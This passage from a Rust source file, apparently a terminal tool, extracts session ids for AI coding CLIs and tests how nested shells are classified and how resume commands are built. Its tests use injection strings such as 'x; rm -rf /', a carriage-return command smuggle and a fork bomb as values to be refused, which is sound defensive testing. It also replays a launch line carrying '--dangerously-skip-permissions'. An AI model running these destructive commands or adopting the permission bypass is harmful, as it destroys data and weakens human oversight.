    if let Some(path) = argv
        .iter()
        .find_map(|a| a.trim_matches('"').strip_prefix("experimental_resume="))
    {
        if let Some(id) = Path::new(path)
            .file_stem()
            .and_then(|s| s.to_str())
            .and_then(trailing_uuid)
        {
            return (Some(id), CliConfidence::Explicit);
        }
    }
    // Bare launch: rollout files are GLOBAL (~/.codex/sessions/YYYY/MM/DD/) —
    // only a unique birth-time match discriminates between terminals.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".codex").join("sessions"), Some("jsonl"), 3);
    let (stem, conf) = birth_correlate(&entries, start_ft);
    match stem.as_deref().and_then(trailing_uuid) {
        Some(id) => (Some(id), conf),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn copilot_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(t) = flag_token(argv, &["--resume", "-r"]) {
        return (Some(t), CliConfidence::Explicit);
    }
    // Bare: per-session dirs named by id under a GLOBAL root.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".copilot").join("session-state"), None, 0);
    birth_correlate(&entries, start_ft)
}

fn qwen_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(t) = flag_token(argv, &["--resume", "--session-id"]) {
        return (Some(t), CliConfidence::Explicit);
    }
    // Per-project chats (~/.qwen/projects/<sanitized>/chats/<id>.jsonl) — the
    // sanitize scheme is qwen's, not ours to guess, so scan all projects and
    // trust only a unique birth-time match.
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let entries = session_entries(&home.join(".qwen").join("projects"), Some("jsonl"), 2);
    birth_correlate(&entries, start_ft)
}

fn goose_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Sessions live in one global SQLite DB: mtime/birth correlation cannot
    // discriminate sessions — argv-Explicit only.
    match flag_token(argv, &["--session-id", "-n", "--name"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn opencode_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Global SQLite DB — argv-Explicit only (see goose).
    match flag_token(argv, &["-s", "--session"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn crush_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // TRAP: `-C` (capital) is continue-last and `-c` is --cwd — neither carries
    // a session id. Only `-s/--session <id>` is an identity.
    match flag_token(argv, &["-s", "--session"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn devin_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Local session storage undocumented — argv-Explicit only.
    match flag_token(argv, &["-r", "--resume"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn cursor_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Cloud-synced, on-disk format unstable — argv-Explicit only
    // (argv_flag_value already handles the `--resume=<id>` form).
    match flag_token(argv, &["--resume"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn amp_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Threads are cloud-only; identity exists solely in argv (`T-…` tokens).
    for seq in [&["threads", "continue"][..], &["threads", "fork"][..]] {
        if let Some(tok) = argv_after_subcommand(argv, seq) {
            if tok.starts_with("T-") && safe_resume_token(&tok) {
                return (Some(tok), CliConfidence::Explicit);
            }
        }
    }
    (None, CliConfidence::Ambiguous)
}

fn cline_extract(
    argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // Storage layout undocumented — argv-Explicit only.
    match flag_token(argv, &["--id"]) {
        Some(t) => (Some(t), CliConfidence::Explicit),
        None => (None, CliConfidence::Ambiguous),
    }
}

fn gemini_extract(
    _argv: &[String],
    _cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // No exact-id resume exists; restore is `gemini --resume` = continue the
    // last session in this cwd, which is exactly what one gemini per dir means.
    (None, CliConfidence::Correlated)
}

fn aider_extract(
    _argv: &[String],
    cwd: &Path,
    _start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // No session ids; history is a fixed per-cwd file. Present → resumable in
    // place; absent → nothing to restore.
    if cwd.join(".aider.chat.history.md").is_file() {
        (None, CliConfidence::Correlated)
    } else {
        (None, CliConfidence::Ambiguous)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(v: &[&str]) -> Vec<String> {
        v.iter().map(|x| x.to_string()).collect()
    }

    /// nested-shell-hooks — `cd '<dir>' && <cli> --resume <sid>`, the shape
    /// Pulse's own resume step types, is attributed to the CLI it ends in
    /// with the cd target as the cwd. Concrete witness only: a relative cd
    /// keeps the shell's reported cwd, a `;`-chain is not split, and a
    /// non-adapter tail still classifies as nothing.
    #[test]
    fn compound_cd_resume_is_attributed() {
        let here = Path::new("/var/log");
        let cli = analyze_cmdline_with_cd(
            "cd '/etc' && claude --resume aaaabbbb-cccc-dddd-eeee-ffff00001111",
            here,
        )
        .expect("the resume step must attribute");
        assert_eq!(cli.adapter, "claude");
        assert_eq!(
            cli.resume_token.as_deref(),
            Some("aaaabbbb-cccc-dddd-eeee-ffff00001111")
        );
        assert_eq!(cli.confidence, CliConfidence::Explicit);
        assert_eq!(cli.cwd, Path::new("/etc"), "the cd target is the CLI's cwd");
        // Unquoted target, same verdict.
        assert_eq!(
            analyze_cmdline_with_cd("cd /etc && claude --resume abc-123", here)
                .unwrap()
                .cwd,
            Path::new("/etc")
        );
        // A bare `claude` after the cd is still attributed — token-less and
        // Ambiguous, exactly like the plain classifier (never a guess).
        let bare = analyze_cmdline_with_cd("cd /etc && claude", here).unwrap();
        assert_eq!(bare.resume_token, None);
        assert_eq!(bare.confidence, CliConfidence::Ambiguous);
        // A RELATIVE cd cannot be resolved from the line alone: keep the
        // shell's own hook-reported cwd rather than inventing one.
        assert_eq!(
            analyze_cmdline_with_cd("cd logs && claude --resume abc-123", here)
                .unwrap()
                .cwd,
            here
        );
        // Not our shape: `;`-chains (the tail may not have run), multi-word
        // cd, a non-cd head, and a tail that names no adapter.
        assert!(analyze_cmdline_with_cd("cd /etc; claude --resume abc", here).is_none());
        assert!(analyze_cmdline_with_cd("cd /etc x && claude", here).is_none());
        assert!(analyze_cmdline_with_cd("ls /etc && claude", here).is_none());
        assert!(analyze_cmdline_with_cd("cd /etc && ls", here).is_none());
        // The plain lane is untouched: a direct launch still wins first.
        assert_eq!(
            analyze_cmdline_with_cd("claude --resume abc-123", here)
                .unwrap()
                .cwd,
            here
        );
    }

    /// Bug D: the nested-shell classifier truth table (§4.1 of the research
    /// doc) — both directions. The table is deliberately conservative: a
    /// false negative degrades to the Busy row, never a wrong statement.
    /// (Moved verbatim from gui::composer with the classifier body — F1.)
    #[test]
    fn nested_shell_cmd_truth_table() {
        // Shell spawners — the honest raw-shell lane.
        for cmd in [
            "sudo su",
            "sudo su -",
            "sudo su - root",
            "sudo -i",
            "sudo -s",
            "sudo --login",
            "sudo bash",
            "sudo -u root bash",
            "sudo -E -H zsh",
            "sudo -- su -",
            "su",
            "su -",
            "su - root",
            "su root",
            "login",
            "bash",
            "bash -l",
            "bash -i",
            "zsh -l",
            "sh",
            "dash",
            "fish",
            "ksh",
            "/usr/bin/bash",
            "/bin/su -",
            "  bash  ",
            // typed-ssh-nested: interactive remote/container login shells.
            "ssh devbox",
            "ssh 203.0.113.10",
            "ssh dev@203.0.113.10",
            "ssh -t host",
            "ssh -tt host",
            "ssh -p 2222 rig@127.0.0.1",
            "ssh -p2222 rig@127.0.0.1",
            "ssh -i ~/.ssh/id_rig rig@host",
            "ssh -o StrictHostKeyChecking=no rig@host",
            "ssh -q -o BatchMode=yes -p 2222 rig@host",
            // Port forwards still allocate an ordinary interactive session;
            // "forwarding only" is spelled -N (below, negative).
            "ssh -L 8080:localhost:80 host",
            "ssh -R 9000:localhost:9000 host",
            "ssh -D 1080 host",
            "ssh -J jump host",
            "/usr/bin/ssh host",
            "ssh.exe host",
            "wsl",
            "wsl -d Ubuntu-24.04",
            "wsl --distribution Ubuntu",
            "docker exec -it web bash",
            "docker exec -ti web bash",
            "docker exec --interactive --tty web bash",
            "docker exec -it -u root web bash",
            "docker exec -it -uroot web zsh",
            "docker exec -it --user=root web sh",
            "docker exec -it -e FOO=1 web bash",
            "podman exec -it box bash",
            "kubectl exec -it mypod -- bash",
            "kubectl exec -it mypod -n prod -c app -- sh",
            "kubectl exec --stdin --tty mypod -- bash",
            "oc exec -it mypod -- bash",
            "distrobox enter",
            "distrobox enter arch",
            "toolbox enter",
            "toolbox enter fedora-40",
            // Gated wsl flags (field report "WSL is still a little iffy"):
            // ordinary interactive invocations that used to fall through.
            "wsl -u root",
            "wsl --user root",
            "wsl --cd /tmp",
            "wsl -d Ubuntu -u root",
        ] {
            assert!(nested_shell_cmd(cmd), "{cmd:?} must classify nested");
        }
        // Finite commands / lookalikes — today's Busy row stays.
        for cmd in [
            "sudo apt install x",
            "sudo systemctl restart nginx",
            "sudo vim /etc/sudoers",
            "sudo",
            "suite",
            "visudo",
            "sushi",
            "bashful",
            "echo bash",
            "bash -c 'sleep 5'",
            "sh -c ls",
            "bash script.sh",
            "bash -",
            "su -c whoami root",
            "sudo bash -c 'apt update'",
            "cat",
            "python3",
            "",
            // typed-ssh-nested negatives — every flag form we accept has its
            // disqualifying twin here.
            "ssh",                             // usage, then exit
            "ssh host uptime",                 // remote command operand
            "ssh host ls -la",
            "ssh -t host 'sudo su'",           // still a command operand (see the doc)
            "ssh -t host sudo su",
            "ssh -N -L 8080:localhost:80 host", // forwarding only
            "ssh -N host",
            "ssh -T host",                     // no pty
            "ssh -n host",
            "ssh -f -N host",
            "ssh -W target:22 jump",           // stdio tunnel
            "ssh -O check host",               // control command
            "ssh -Q cipher",
            "ssh -G host",
            "ssh -V",
            "ssh --help",
            "ssh --",
            "ssh -",
            "ssh -p",                          // flag-value miss ⇒ FALSE
            "ssh -i",
            "ssh -o",
            "ssh -p 2222",                     // no destination
            "sshuttle -r host 0/0",            // lookalike stem
            "sshfs host:/ /mnt",
            "wsl ls",
            "wsl -e bash",
            // Microsoft's internal system distro, not the user's shell.
            "wsl --system",
            "wsl -d Ubuntu ls",
            // `wsl -u root` MOVED to the positive set above (field report
            // "WSL is still a little iffy"): the known value-consuming flags
            // are gated now instead of refused wholesale. These keep failing
            // for their own reasons — a command operand, and a flag-value
            // miss.
            "wsl -u root ls",
            "wsl -u",
            "docker exec web bash",            // no -it
            "docker exec -i web bash",         // no tty
            "docker exec -t web bash",         // no stdin
            "docker exec -it web ls",          // finite command
            "docker exec -it web",             // no command
            "docker exec -dit web bash",       // detached
            "docker exec -it --detach web bash",
            "docker exec -it --nonesuch web bash", // unmodelled flag ⇒ FALSE
            "docker exec -it -u web bash",     // -u eats "web": no container left
            "docker run -it ubuntu bash",      // `run` deliberately not covered
            "docker ps",
            "podman exec box bash",
            "kubectl exec -it mypod bash",     // no `--` separator
            "kubectl exec -it mypod -- ls",
            "kubectl exec mypod -- bash",      // no -it
            "kubectl get pods",
            "kubectl exec -it mypod --",       // empty command
            "distrobox",
            "distrobox list",
            "distrobox enter arch -- ls",
            "distrobox enter -e ls",
            "toolbox run fedora ls",
        ] {
            assert!(!nested_shell_cmd(cmd), "{cmd:?} must NOT classify nested");
        }
    }

    /// typed-ssh-nested: the two classifiers that answer "is the world behind
    /// this argv an interactive POSIX shell?" — the TERMINAL one
    /// (`state::shell_family`, which decides whether a spawned ssh/wsl
    /// terminal gets hooks) and the NESTED one (`nested_shell_cmd`, which
    /// decides whether a TYPED opener starts an episode) — must never
    /// disagree on a shape both can see. A disagreement is the
    /// double-classification hazard: a program-level ssh terminal whose own
    /// argv also reads as a nested opener, or vice versa.
    #[test]
    fn typed_and_program_level_ssh_agree() {
        use crate::state::{shell_family, ShellFamily, TermKind};
        for argv in [
            vec!["host"],
            vec!["dev@203.0.113.10"],
            vec!["-p", "2222", "rig@127.0.0.1"],
            vec!["-p2222", "rig@127.0.0.1"],
            vec!["-i", "key", "host"],
            vec!["-t", "host"],
            vec!["host", "uptime"],
            vec!["-t", "host", "sudo", "su"],
            vec!["-p"],
            vec![],
        ] {
            let owned: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
            let program_level = matches!(
                shell_family(&TermKind::Shell, "ssh.exe", &owned),
                ShellFamily::Ssh { .. }
            );
            let typed = nested_shell_cmd(&format!("ssh {}", argv.join(" ")));
            assert_eq!(
                program_level, typed,
                "ssh {argv:?}: program-level={program_level} typed={typed}"
            );
        }
        // Where they intentionally diverge, the NESTED side is the stricter
        // one — never the other way round (a nested false positive is what
        // types into a live shell).
        for argv in [vec!["-N", "host"], vec!["-T", "host"], vec!["-W", "h:22", "j"]] {
            let owned: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
            assert!(matches!(
                shell_family(&TermKind::Shell, "ssh.exe", &owned),
                ShellFamily::Ssh { .. }
            ));
            assert!(!nested_shell_cmd(&format!("ssh {}", argv.join(" "))));
        }
    }

    /// typed-ssh-nested: only the CROSSING openers may arm an injection from
    /// a pwsh/cmd terminal — the hook body is bash/zsh, so the world the
    /// opener lands in has to be POSIX by construction.
    #[test]
    fn crosses_to_posix_table() {
        for cmd in [
            "ssh host",
            "/usr/bin/ssh host",
            "ssh.exe host",
            "wsl",
            "docker exec -it c bash",
            "podman exec -it c bash",
            "kubectl exec -it p -- bash",
            "oc exec -it p -- bash",
            "distrobox enter",
            "toolbox enter",
        ] {
            assert!(crosses_to_posix(cmd), "{cmd:?} must cross to POSIX");
        }
        for cmd in [
            "sudo su", "su -", "bash", "zsh", "sh", "dash", "fish", "ksh", "login", "",
            "sshuttle -r h 0/0", "wslconfig /l",
        ] {
            assert!(!crosses_to_posix(cmd), "{cmd:?} must NOT cross to POSIX");
        }
    }

    fn chain(cmds: &[&str], cli_cwd: Option<&str>) -> crate::state::NestedChain {
        crate::state::NestedChain {
            cmds: s(cmds),
            entered_cwd: PathBuf::from("/home/dev"),
            cli_cwd: cli_cwd.map(PathBuf::from),
            opened_ms: 1,
            launch_cmd: None,
        }
    }

    fn nested_cli(adapter: &str, token: Option<&str>) -> InnerCli {
        InnerCli {
            adapter: adapter.into(),
            resume_token: token.map(str::to_string),
            confidence: CliConfidence::Explicit,
            cwd: PathBuf::from("/"),
            nested: true,
            // Argv provenance by default: the conservative half.
            token_self_reported: false,
        }
    }

    /// A nested identity whose token is the CLI's OWN report (tcbeacon /
    /// SessionStart hook / pid registry) — the only provenance that may
    /// append a resume to a replayed launch line.
    fn beacon_cli(adapter: &str, token: &str) -> InnerCli {
        InnerCli {
            token_self_reported: true,
            ..nested_cli(adapter, Some(token))
        }
    }

    /// The pre-F2 (manual) wording — `auto = false` keeps every golden below
    /// byte-exact.
    fn nested_restore_notice_f(
        chain: &crate::state::NestedChain,
        cli: Option<&InnerCli>,
    ) -> String {
        nested_restore_notice(chain, cli, false, None)
    }

    /// F2 goldens — the `auto = true` variants: the chain announces itself
    /// as auto-typed; the inner-CLI resume hint stays manual and verbatim
    /// (I1 unchanged); every escaping choke point is shared with the manual
    /// variants (one composition function).
    #[test]
    fn nested_restore_notice_auto_golden() {
        let cli = nested_cli("claude", Some("xyz"));
        // Auto variant A.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], Some("/")), Some(&cli), true, None),
            "── re-establishing this terminal's nested shell (sudo su) automatically; its claude session was not auto-resumed — resume: cd '/'; claude --resume xyz ──"
        );
        // Auto variant B.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], None), Some(&cli), true, None),
            "── re-establishing this terminal's nested shell (sudo su) automatically; its claude session was not auto-resumed — resume: claude --resume xyz (run it from the conversation's directory) ──"
        );
        // Auto variant C.
        assert_eq!(
            nested_restore_notice(&chain(&["sudo su"], None), None, true, None),
            "── re-establishing this terminal's nested shell (sudo su) automatically; anything that ran inside it was not restored ──"
        );
        // The unsafe-token choke point degrades to auto-C — never a mangled
        // command, exactly like the manual lane.
        let evil = nested_cli("claude", Some("x; rm -rf /"));
        let n = nested_restore_notice(&chain(&["sudo su"], Some("/")), Some(&evil), true, None);
        assert!(
            n.contains("anything that ran inside it was not restored") && !n.contains("rm -rf"),
            "unsafe token must degrade to auto variant C: {n}"
        );
    }

    /// Nested-cli-resume — the FULL-sequence notice: promised only when the
    /// composed resume step rides along, exact command inline (it doubles as
    /// the abort fallback), and the abort hint golden.
    #[test]
    fn nested_resume_notice_and_hint_golden() {
        let cli = nested_cli("claude", Some("xyz"));
        let ch = chain(&["sudo su"], Some("/"));
        let step = nested_resume_step(&ch, Some(&cli)).unwrap();
        assert_eq!(step.cmd, "cd '/' && claude --resume xyz");
        assert!(step.resumes);
        assert_eq!(
            nested_restore_notice(&ch, Some(&cli), true, Some(&step)),
            "── re-establishing this terminal's nested shell (sudo su) and resuming its claude session automatically — if it stops: cd '/' && claude --resume xyz ──"
        );
        assert_eq!(
            nested_resume_abort_hint("claude", &step),
            "── claude session was not auto-resumed — resume: cd '/' && claude --resume xyz ──"
        );
        // auto=false never promises a resume even when a step exists (the
        // manual notice is the honest wording for a hookless/opted-out spawn).
        assert_eq!(
            nested_restore_notice(&ch, Some(&cli), false, Some(&step)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; cd '/'; claude --resume xyz ──"
        );
    }

    /// Nested-cli-resume — the resume-step gating matrix: a COMPLETE
    /// breadcrumb (nested identity + safe concrete token + beacon-witnessed
    /// cwd) or nothing. Missing/unsafe halves must never compose a guess.
    #[test]
    fn nested_resume_step_gating_matrix() {
        let full = chain(&["sudo su"], Some("/srv/app"));
        let no_cwd = chain(&["sudo su"], None);
        let cli = nested_cli("claude", Some("abc-123"));
        // Complete breadcrumb ⇒ the exact typed step (quoted cwd, && join).
        assert_eq!(
            nested_resume_step(&full, Some(&cli)).map(|s| s.cmd).as_deref(),
            Some("cd '/srv/app' && claude --resume abc-123")
        );
        // Missing cwd ⇒ None (never guess the directory).
        assert_eq!(nested_resume_step(&no_cwd, Some(&cli)), None);
        // Missing identity / missing token ⇒ None (never guess the session).
        assert_eq!(nested_resume_step(&full, None), None);
        assert_eq!(nested_resume_step(&full, Some(&nested_cli("claude", None))), None);
        // Unsafe token ⇒ None via the shared r3-S1 choke point.
        assert_eq!(
            nested_resume_step(&full, Some(&nested_cli("claude", Some("x; rm -rf /")))),
            None
        );
        // A NON-nested identity never rides this lane (it has its own
        // restore trailing at the OUTER shell).
        let mut outer = nested_cli("claude", Some("abc-123"));
        outer.nested = false;
        assert_eq!(nested_resume_step(&full, Some(&outer)), None);
        // Unknown adapter ⇒ None (registry gate).
        assert_eq!(
            nested_resume_step(&full, Some(&nested_cli("frobnicator", Some("abc")))),
            None
        );
        // Quote-bearing cwd is escaped, never spliced raw.
        let quoted = chain(&["sudo su"], Some("/a'b"));
        assert_eq!(
            nested_resume_step(&quoted, Some(&cli)).map(|s| s.cmd).as_deref(),
            Some("cd '/a'\\''b' && claude --resume abc-123")
        );
    }

    fn chain_launched(cli_cwd: &str, launch: Option<&str>) -> crate::state::NestedChain {
        let mut c = chain(&["sudo su"], Some(cli_cwd));
        c.launch_cmd = launch.map(str::to_string);
        c
    }

    /// env-prefix-cli — the REPLAY rule. A witnessed launch line is
    /// re-typed VERBATIM (env prefix and flags intact); composing `<cli>
    /// --resume <sid>` is only the no-witness fallback.
    ///
    /// The user's flow is row 1: he exports `IS_SANDBOX=1` so bypass-all
    /// permissions is allowed as root, launches BARE, and picks his
    /// conversation with `/resume` inside the TUI. Composing a resume for
    /// him would drop `IS_SANDBOX=1`, drop
    /// `--dangerously-skip-permissions` — both of which ARE the security
    /// posture of what gets started — and re-enter a session id he never
    /// asked for (the argv id is stale after an in-TUI `/resume`, and the
    /// pid-registry correction that repairs that locally cannot reach a
    /// remote host).
    #[test]
    fn nested_replay_step_matrix() {
        let u = Uuid::new_v4().to_string();
        let cli = nested_cli("claude", Some("abc-123"));
        let tokenless = nested_cli("claude", None);

        // 1. THE FIELD LINE: replayed byte-identical, and honestly flagged
        //    as a re-launch rather than a resume.
        let ch = chain_launched(
            "/srv/app",
            Some("IS_SANDBOX=1 claude --dangerously-skip-permissions"),
        );
        let step = nested_resume_step(&ch, Some(&tokenless)).expect("witness must replay");
        assert_eq!(
            step.cmd,
            "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"
        );
        assert!(!step.resumes);
        // A stale token on the identity must NOT re-compose over the
        // witnessed line — the line the user ran wins.
        let step = nested_resume_step(&ch, Some(&cli)).unwrap();
        assert_eq!(
            step.cmd,
            "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"
        );
        assert!(!step.resumes);

        // 2. A witnessed line that DOES name a session replays verbatim too
        //    — and is a real resume, even though the identity's own token
        //    (`abc-123`) differs.
        let ch = chain_launched("/srv/app", Some(&format!("claude --resume {u}")));
        let step = nested_resume_step(&ch, Some(&cli)).unwrap();
        assert_eq!(step.cmd, format!("cd '/srv/app' && claude --resume {u}"));
        assert!(step.resumes);

        // 3. NO witnessed line: the composed resume, byte-identical to the
        //    pre-change behaviour, and only with a concrete token.
        let ch = chain_launched("/srv/app", None);
        let step = nested_resume_step(&ch, Some(&cli)).unwrap();
        assert_eq!(step.cmd, "cd '/srv/app' && claude --resume abc-123");
        assert!(step.resumes);
        assert_eq!(nested_resume_step(&ch, Some(&tokenless)), None);

        // 4. A witness the replay REFUSES falls back to the composed
        //    resume (and to None when there is no token to compose from).
        for bad in [
            // A control byte would submit a second command line: this
            // string is typed into the PTY followed by `\r`.
            "claude --resume abc\rrm -rf /",
            "claude\n:(){ :|:& };:",
            // Not this identity's adapter, and not a CLI at all.
            "codex resume abc-123",
            "ls -la",
            "",
            "   ",
        ] {
            let ch = chain_launched("/srv/app", Some(bad));
            assert_eq!(
                nested_resume_step(&ch, Some(&cli)).map(|s| s.cmd).as_deref(),
                Some("cd '/srv/app' && claude --resume abc-123"),
                "{bad:?} must fall back to the composed resume"
            );
            assert_eq!(nested_resume_step(&ch, Some(&tokenless)), None, "{bad:?}");
        }
        // Over-long lines are refused the same way.
        let long = format!("claude --resume {}", "a".repeat(REPLAY_LINE_MAX));
        let ch = chain_launched("/srv/app", Some(&long));
        assert_eq!(
            nested_resume_step(&ch, Some(&cli)).map(|s| s.cmd).as_deref(),
            Some("cd '/srv/app' && claude --resume abc-123")
        );

        // 5. The replayed step is itself witnessed back by the nested
        //    shell's hooks — its `cd` head must be normalised off, or the
        //    line would grow one `cd '<dir>' &&` per reconnect.
        assert_eq!(
            witnessed_launch_line(
                "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"
            )
            .as_deref(),
            Some("IS_SANDBOX=1 claude --dangerously-skip-permissions")
        );
        let ch = chain_launched(
            "/srv/app",
            Some("cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"),
        );
        assert_eq!(
            nested_resume_step(&ch, Some(&tokenless)).map(|s| s.cmd).as_deref(),
            Some("cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"),
            "a re-witnessed replay must not double its cd head"
        );

        // 6. Every other gate is unchanged: no witnessed cwd, a non-nested
        //    identity, and an unknown adapter still compose nothing.
        let mut no_cwd = chain_launched("/srv/app", Some("claude"));
        no_cwd.cli_cwd = None;
        assert_eq!(nested_resume_step(&no_cwd, Some(&cli)), None);
        let mut outer = cli.clone();
        outer.nested = false;
        assert_eq!(
            nested_resume_step(&chain_launched("/srv/app", Some("claude")), Some(&outer)),
            None
        );
    }

    /// env-prefix-cli — PROVENANCE decides whether a replayed BARE launch
    /// also carries a resume. The witnessed line is replayed verbatim in
    /// every row (his env prefix and `--dangerously-skip-permissions` never
    /// move); the only question is whether ` --resume <sid>` is appended to
    /// it, and the answer is "only when the CLI ITSELF named the session".
    ///
    /// This is what keeps v0.1.13's nested auto-resume alive for identities
    /// that are real, without ever resuming from an argv id that goes stale
    /// the moment the user runs `/resume` inside the TUI.
    #[test]
    fn nested_replay_resume_provenance_matrix() {
        let u = Uuid::new_v4().to_string();
        let bare = |launch: &str| chain_launched("/srv/app", Some(launch));

        // 1. BEACON provenance + a bare witnessed line ⇒ replay + append.
        let beacon = beacon_cli("claude", &u);
        let step = nested_resume_step(&bare("claude"), Some(&beacon)).unwrap();
        assert_eq!(step.cmd, format!("cd '/srv/app' && claude --resume {u}"));
        assert!(step.resumes);
        // ...and the env prefix + flags of the FIELD line survive the append.
        let step = nested_resume_step(
            &bare("IS_SANDBOX=1 claude --dangerously-skip-permissions"),
            Some(&beacon),
        )
        .unwrap();
        assert_eq!(
            step.cmd,
            format!(
                "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions --resume {u}"
            )
        );
        assert!(step.resumes);

        // 2. ARGV provenance + a bare line ⇒ bare replay, NO append. (An
        //    argv id is stale after an in-TUI `/resume`, and no remote host
        //    has the pid-registry correction that repairs that locally.)
        let argv = nested_cli("claude", Some(&u));
        assert!(!argv.token_self_reported);
        let step = nested_resume_step(&bare("claude"), Some(&argv)).unwrap();
        assert_eq!(step.cmd, "cd '/srv/app' && claude");
        assert!(!step.resumes);
        // The user's own field line, argv provenance: byte-identical replay.
        let step = nested_resume_step(
            &bare("IS_SANDBOX=1 claude --dangerously-skip-permissions"),
            Some(&argv),
        )
        .unwrap();
        assert_eq!(
            step.cmd,
            "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions"
        );
        assert!(!step.resumes);

        // 3. The witnessed line ALREADY names a session ⇒ verbatim, never a
        //    second flag — whichever provenance the identity carries, and
        //    even when its own token differs.
        let other = Uuid::new_v4().to_string();
        for cli in [beacon_cli("claude", &other), nested_cli("claude", Some(&other))] {
            for launch in [
                format!("claude --resume {u}"),
                format!("claude --resume={u}"),
                format!("IS_SANDBOX=1 claude --session-id {u} --dangerously-skip-permissions"),
            ] {
                let step = nested_resume_step(&bare(&launch), Some(&cli)).unwrap();
                assert_eq!(step.cmd, format!("cd '/srv/app' && {launch}"));
                assert!(step.resumes, "{launch:?}");
                assert_eq!(step.cmd.matches("--resume").count() + step.cmd.matches("--session-id").count(), 1);
            }
        }

        // 4. NO witnessed line + a beacon token ⇒ the composed form, exactly
        //    as before this branch existed.
        let mut none = bare("claude");
        none.launch_cmd = None;
        let step = nested_resume_step(&none, Some(&beacon)).unwrap();
        assert_eq!(step.cmd, format!("cd '/srv/app' && claude --resume {u}"));
        assert!(step.resumes);

        // 5. Gate (c): the adapter must have an APPENDABLE resume flag. codex
        //    resumes by SUBCOMMAND (`codex resume <id>`), which cannot follow
        //    the user's flags ⇒ bare replay even with beacon provenance.
        assert_eq!(appendable_resume_suffix("claude", &u), Some(format!("--resume {u}")));
        assert_eq!(appendable_resume_suffix("codex", &u), None);
        assert_eq!(appendable_resume_suffix("goose", &u), None);
        assert_eq!(appendable_resume_suffix("crush", &u), Some(format!("--session {u}")));
        // Not this adapter's literal name (`cursor` -> `cursor-agent …`),
        // and a "resume the last one" trailing that carries no token.
        assert_eq!(appendable_resume_suffix("cursor", &u), None);
        assert_eq!(appendable_resume_suffix("aider", &u), None);
        assert_eq!(appendable_resume_suffix("gemini", &u), None);
        assert_eq!(appendable_resume_suffix("frobnicator", &u), None);
        // An unsafe token dies at the shared r3-S1 choke point.
        assert_eq!(appendable_resume_suffix("claude", "x; rm -rf /"), None);
        let step = nested_resume_step(&bare("codex"), Some(&beacon_cli("codex", &u))).unwrap();
        assert_eq!(step.cmd, "cd '/srv/app' && codex");
        assert!(!step.resumes);

        // 6. Gate: the line's end must be the end of the CLI's own argv.
        for line in [
            "claude | tee out.log",
            "claude && echo done",
            "claude > out.log",
            "claude # note to self",
            "claude $EXTRA",
        ] {
            assert!(!appendable_line(line), "{line:?}");
            let step = nested_resume_step(&bare(line), Some(&beacon)).unwrap();
            assert_eq!(step.cmd, format!("cd '/srv/app' && {line}"), "{line:?}");
            assert!(!step.resumes, "{line:?}");
        }
        assert!(appendable_line("IS_SANDBOX=1 claude --dangerously-skip-permissions"));

        // 7. The notice + hint follow the STEP, so an appended resume says
        //    "resuming" and a bare replay says "re-launching".
        let appended = nested_resume_step(
            &bare("IS_SANDBOX=1 claude --dangerously-skip-permissions"),
            Some(&beacon),
        )
        .unwrap();
        let n = nested_restore_notice(&bare("x"), Some(&beacon), true, Some(&appended));
        assert!(
            n.contains("resuming its claude session automatically")
                && n.contains(&format!("--dangerously-skip-permissions --resume {u}")),
            "{n}"
        );
        assert!(nested_resume_abort_hint("claude", &appended)
            .contains("session was not auto-resumed"));
    }

    /// env-prefix-cli — a re-LAUNCH is announced as one. The pre-existing
    /// "resuming its <a> session" wording stays byte-exact for steps that
    /// really do name a session (asserted in
    /// `nested_resume_notice_and_hint_golden`); a verbatim replay of a bare
    /// launch says what it actually does, because this lane never claims
    /// more than it did.
    #[test]
    fn nested_relaunch_notice_and_hint_golden() {
        let ch = chain_launched(
            "/srv/app",
            Some("IS_SANDBOX=1 claude --dangerously-skip-permissions"),
        );
